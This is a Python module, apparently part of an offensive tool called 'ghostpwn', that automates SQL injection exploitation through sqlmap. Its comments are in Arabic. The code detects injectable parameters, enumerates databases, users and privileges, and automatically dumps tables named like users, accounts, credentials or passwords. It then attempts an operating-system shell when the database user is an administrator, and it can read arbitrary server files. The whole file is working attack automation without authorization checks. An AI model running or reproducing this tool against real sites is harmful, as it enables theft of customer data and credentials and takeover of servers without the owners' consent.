#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - sqlmap Integration
تكامل sqlmap في الأداة للاستغلال الأوتوماتيكي لـ SQLi

الاستخدام:
  python3 -m modules.sqlmap_integration --url "http://target.com/page?id=1" --action dump
"""
import os
import sys
import re
import time
import subprocess
import json
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.arabic_display import SmartLogger, Colors, fix_display


class SQLmapIntegration:
    """تكامل sqlmap في ghostpwn"""

    def __init__(self, audit_logger=None, timeout: int = 300):
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.timeout = timeout
        self.sqlmap_path = self._find_sqlmap()
        self.results = {
            "vulnerable": False,
            "dbs": [],
            "tables": [],
            "dumped_data": {},
            "os_shell": False,
            "current_db": None,
            "current_user": None,
            "is_dba": False,
            "banner": None,
            "hostname": None,
        }

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[SQLMAP] {msg}", level)

    def _find_sqlmap(self) -> str:
        """البحث عن sqlmap"""
        # محاولة paths شائعة
        paths = [
            "sqlmap",
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "/opt/sqlmap/sqlmap.py",
            "/usr/share/sqlmap/sqlmap.py",
        ]
        for path in paths:
            try:
                result = subprocess.run(
                    ["which", path] if "/" not in path else ["test", "-f", path],
                    capture_output=True, timeout=5
                )
                if result.returncode == 0 or os.path.isfile(path):
                    return path
            except Exception:
                pass

        # محاولة python3 sqlmap.py
        try:
            result = subprocess.run(
                ["sqlmap", "--version"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 or "sqlmap" in result.stderr.lower():
                return "sqlmap"
        except Exception:
            pass

        return None

    def is_available(self) -> bool:
        """فحص إذا كان sqlmap متاح"""
        return self.sqlmap_path is not None

    def _run_sqlmap(self, url: str, extra_args: List[str] = None,
                    batch: bool = True, timeout: int = None) -> Tuple[str, str, int]:
        """تنفيذ sqlmap"""
        if not self.is_available():
            self._log("sqlmap غير متاح - ثبّته: apt install sqlmap", "error")
            return "", "sqlmap not found", 1

        cmd = [self.sqlmap_path, "-u", url]

        if batch:
            cmd.append("--batch")

        # إعدادات أساسية
        cmd.extend([
            "--level=3",
            "--risk=2",
            "--threads=5",
            "--random-agent",
            "--flush-session",
        ])

        if extra_args:
            cmd.extend(extra_args)

        self._log(f"تنفيذ: {' '.join(cmd[:10])}...", "info")

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout or self.timeout,
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            self._log("sqlmap انتهى وقته", "warn")
            return "", "Timeout", 124
        except Exception as e:
            self._log(f"خطأ sqlmap: {e}", "error")
            return "", str(e), 1

    # ============================ Actions ============================

    def detect(self, url: str) -> bool:
        """فحص SQLi"""
        self._log(f"فحص SQLi على: {url}", "phase")

        stdout, stderr, rc = self._run_sqlmap(url, [
            "--smart",
            "--text-only",
        ], timeout=120)

        # فحص الناتج
        if "is vulnerable" in stdout.lower() or "injectable" in stdout.lower():
            self._log("تم تأكيد SQLi!", "success")
            self.results["vulnerable"] = True

            # استخراج نوع الحقن
            if "boolean-based" in stdout.lower():
                self._log("  النوع: Boolean-based blind", "info")
            if "error-based" in stdout.lower():
                self._log("  النوع: Error-based", "info")
            if "time-based" in stdout.lower():
                self._log("  النوع: Time-based blind", "info")
            if "union query" in stdout.lower():
                self._log("  النوع: UNION query", "info")
            if "stacked queries" in stdout.lower():
                self._log("  النوع: Stacked queries", "info")

            return True
        else:
            self._log("لا توجد SQLi", "info")
            return False

    def get_dbs(self, url: str) -> List[str]:
        """استخراج قائمة قواعد البيانات"""
        self._log("استخراج قواعد البيانات...", "phase")

        stdout, _, _ = self._run_sqlmap(url, ["--dbs"], timeout=180)

        # استخراج أسماء الـ DBs
        dbs = []
        lines = stdout.split("\n")
        capture = False
        for line in lines:
            line = line.strip()
            if "available databases" in line.lower():
                capture = True
                continue
            if capture:
                if line and not line.startswith("[") and not line.startswith("*"):
                    if "[" in line:
                        # استخراج الاسم بين أقواس
                        match = re.search(r'\[([^\]]+)\]', line)
                        if match:
                            dbs.append(match.group(1))
                    elif line and len(line) > 1:
                        dbs.append(line)
                if line.startswith("[*]") or "ending" in line.lower():
                    if capture and dbs:
                        break

        # fallback: regex
        if not dbs:
            matches = re.findall(r'\[\*\]\s+([^\n]+)', stdout)
            for m in matches:
                m = m.strip()
                if m and "ending" not in m.lower() and "starting" not in m.lower():
                    dbs.append(m)

        self.results["dbs"] = dbs
        self._log(f"تم العثور على {len(dbs)} قاعدة بيانات", "success")
        for db in dbs:
            self._log(f"  - {db}", "info")

        return dbs

    def get_tables(self, url: str, db: str = None) -> List[str]:
        """استخراج الجداول"""
        if db:
            self._log(f"استخراج جداول {db}...", "phase")
            stdout, _, _ = self._run_sqlmap(url, ["--tables", f"-D", db], timeout=180)
        else:
            self._log("استخراج الجداول...", "phase")
            stdout, _, _ = self._run_sqlmap(url, ["--tables"], timeout=180)

        tables = []
        lines = stdout.split("\n")
        capture = False
        for line in lines:
            line = line.strip()
            if "Database:" in line:
                capture = True
                continue
            if capture and line and not line.startswith("[") and "|" not in line:
                if line.startswith("+"):
                    continue
                tables.append(line)
            if "ending" in line.lower() and capture:
                break

        # fallback: regex
        if not tables:
            matches = re.findall(r'\|\s+([^\|\s]+)\s+\|', stdout)
            tables = [m for m in matches if m not in ["Table", "----"]]

        self.results["tables"] = tables
        self._log(f"تم العثور على {len(tables)} جدول", "success")
        return tables

    def dump_table(self, url: str, db: str, table: str) -> Dict:
        """استخراج بيانات جدول"""
        self._log(f"استخراج بيانات {db}.{table}...", "phase")

        stdout, _, _ = self._run_sqlmap(url, [
            "--dump",
            f"-D", db,
            f"-T", table,
        ], timeout=300)

        # استخراج البيانات
        data = {
            "database": db,
            "table": table,
            "rows": [],
            "columns": [],
        }

        # استخراج الأعمدة والصفوف من الناتج
        lines = stdout.split("\n")
        in_table = False
        for line in lines:
            if "|" in line and "---" not in line:
                cells = [c.strip() for c in line.split("|") if c.strip()]
                if cells:
                    if not data["columns"]:
                        data["columns"] = cells
                    else:
                        data["rows"].append(cells)

        data["row_count"] = len(data["rows"])
        self.results["dumped_data"][f"{db}.{table}"] = data
        self._log(f"تم استخراج {data['row_count']} صف", "success")

        return data

    def dump_all(self, url: str, db: str = None) -> Dict:
        """استخراج كل البيانات"""
        self._log("استخراج كل البيانات...", "phase")

        if db:
            stdout, _, _ = self._run_sqlmap(url, ["--dump", "-D", db], timeout=600)
        else:
            stdout, _, _ = self._run_sqlmap(url, ["--dump-all"], timeout=600)

        self._log("تم استخراج البيانات", "success")
        return {"output": stdout[:5000]}

    def get_current_db(self, url: str) -> Optional[str]:
        """الحصول على اسم الـ DB الحالية"""
        stdout, _, _ = self._run_sqlmap(url, ["--current-db"], timeout=120)
        match = re.search(r'\[?\*?\]?\s*(?:current database|currentDatabase):\s*[\'"]?([^\'"\n\]]+)', stdout, re.IGNORECASE)
        if match:
            db = match.group(1).strip()
            self.results["current_db"] = db
            self._log(f"الـ DB الحالية: {db}", "success")
            return db
        return None

    def get_current_user(self, url: str) -> Optional[str]:
        """الحصول على المستخدم الحالي"""
        stdout, _, _ = self._run_sqlmap(url, ["--current-user"], timeout=120)
        match = re.search(r'(?:current user|currentUser):\s*[\'"]?([^\'"\n\]]+)', stdout, re.IGNORECASE)
        if match:
            user = match.group(1).strip()
            self.results["current_user"] = user
            self._log(f"المستخدم: {user}", "success")
            return user
        return None

    def is_dba(self, url: str) -> bool:
        """فحص إذا كان المستخدم DBA"""
        stdout, _, _ = self._run_sqlmap(url, ["--is-dba"], timeout=120)
        if "true" in stdout.lower() and "dba" in stdout.lower():
            self.results["is_dba"] = True
            self._log("المستخدم DBA!", "success")
            return True
        return False

    def get_banner(self, url: str) -> Optional[str]:
        """الحصول على banner"""
        stdout, _, _ = self._run_sqlmap(url, ["--banner"], timeout=120)
        match = re.search(r'banner:\s*[\'"]?([^\'"\n]+)', stdout, re.IGNORECASE)
        if match:
            banner = match.group(1).strip()
            self.results["banner"] = banner
            self._log(f"Banner: {banner}", "info")
            return banner
        return None

    def get_os_shell(self, url: str) -> bool:
        """محاولة الحصول على OS shell"""
        self._log("محاولة OS shell...", "phase")
        stdout, _, rc = self._run_sqlmap(url, ["--os-shell"], timeout=60)

        if "os shell" in stdout.lower() or "command prompt" in stdout.lower():
            self._log("OS shell متاح!", "success")
            self.results["os_shell"] = True
            return True
        return False

    def read_file(self, url: str, filepath: str) -> Optional[str]:
        """قراءة ملف عبر sqlmap"""
        self._log(f"قراءة ملف: {filepath}", "info")
        stdout, _, _ = self._run_sqlmap(url, ["--file-read", filepath], timeout=120)

        # البحث عن المسار المحفوظ
        match = re.search(r'saved to:\s*(.+)', stdout, re.IGNORECASE)
        if match:
            saved_path = match.group(1).strip()
            try:
                with open(saved_path, "r") as f:
                    content = f.read()
                self._log(f"تم قراءة الملف ({len(content)} bytes)", "success")
                return content
            except Exception:
                pass
        return None

    def full_exploit(self, url: str) -> Dict:
        """استغلال كامل"""
        self._log("بدء الاستغلال الكامل بـ sqlmap...", "phase")

        # 1) فحص
        if not self.detect(url):
            return self.results

        # 2) معلومات أساسية
        self.get_current_db(url)
        self.get_current_user(url)
        self.get_banner(url)
        self.is_dba(url)

        # 3) قائمة DBs
        dbs = self.get_dbs(url)

        # 4) استخراج الجداول من الـ DB الحالية
        if self.results["current_db"]:
            tables = self.get_tables(url, self.results["current_db"])

            # 5) استخراج البيانات من الجداول المهمة
            interesting_tables = [
                "users", "user", "accounts", "admin", "admins",
                "members", "customers", "credentials", "logins",
                "passwords", "settings", "config",
            ]

            for table in tables:
                if any(t in table.lower() for t in interesting_tables):
                    self.dump_table(url, self.results["current_db"], table)

        # 6) محاولة OS shell
        if self.results["is_dba"]:
            self.get_os_shell(url)

        return self.results

    def print_results(self):
        """عرض النتائج"""
        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  💉 sqlmap Results{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        r = self.results
        print(f"\n  {Colors.BOLD}Vulnerable:{Colors.NC} {'✓' if r['vulnerable'] else '✗'}")
        if r["current_db"]:
            print(f"  {Colors.BOLD}Current DB:{Colors.NC} {r['current_db']}")
        if r["current_user"]:
            print(f"  {Colors.BOLD}User:{Colors.NC} {r['current_user']}")
        if r["banner"]:
            print(f"  {Colors.BOLD}Banner:{Colors.NC} {r['banner']}")
        print(f"  {Colors.BOLD}DBA:{Colors.NC} {'✓' if r['is_dba'] else '✗'}")

        if r["dbs"]:
            print(f"\n  {Colors.BOLD}Databases ({len(r['dbs'])}):{Colors.NC}")
            for db in r["dbs"]:
                print(f"    - {db}")

        if r["tables"]:
            print(f"\n  {Colors.BOLD}Tables ({len(r['tables'])}):{Colors.NC}")
            for t in r["tables"][:20]:
                print(f"    - {t}")

        if r["dumped_data"]:
            print(f"\n  {Colors.BOLD}Dumped Data:{Colors.NC}")
            for key, data in r["dumped_data"].items():
                print(f"    {key}: {data['row_count']} rows")

        if r["os_shell"]:
            print(f"\n  {Colors.RED + Colors.BOLD}⚠️  OS Shell متاح!{Colors.NC}")

        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - sqlmap Integration")
    parser.add_argument("url", help="Target URL with parameter (e.g., http://target.com/page?id=1)")
    parser.add_argument("--action", choices=["detect", "dbs", "tables", "dump", "dump-all", "full", "os-shell", "read-file"],
                       default="full", help="Action to perform")
    parser.add_argument("--db", help="Target database")
    parser.add_argument("--table", help="Target table")
    parser.add_argument("--file", help="File to read")
    parser.add_argument("--cookie", help="Cookie string")
    args = parser.parse_args()

    sqlmap = SQLmapIntegration()

    if not sqlmap.is_available():
        print(f"\n{Colors.RED}[!] sqlmap غير متاح{Colors.NC}")
        print(f"    ثبّته: apt install sqlmap")
        sys.exit(1)

    if args.action == "detect":
        sqlmap.detect(args.url)
    elif args.action == "dbs":
        sqlmap.get_dbs(args.url)
    elif args.action == "tables":
        sqlmap.get_tables(args.url, args.db)
    elif args.action == "dump":
        if args.db and args.table:
            sqlmap.dump_table(args.url, args.db, args.table)
        else:
            print("[!] --db and --table required for dump")
    elif args.action == "dump-all":
        sqlmap.dump_all(args.url, args.db)
    elif args.action == "full":
        sqlmap.full_exploit(args.url)
    elif args.action == "os-shell":
        sqlmap.get_os_shell(args.url)
    elif args.action == "read-file":
        if args.file:
            content = sqlmap.read_file(args.url, args.file)
            if content:
                print(content[:1000])
        else:
            print("[!] --file required")

    sqlmap.print_results()
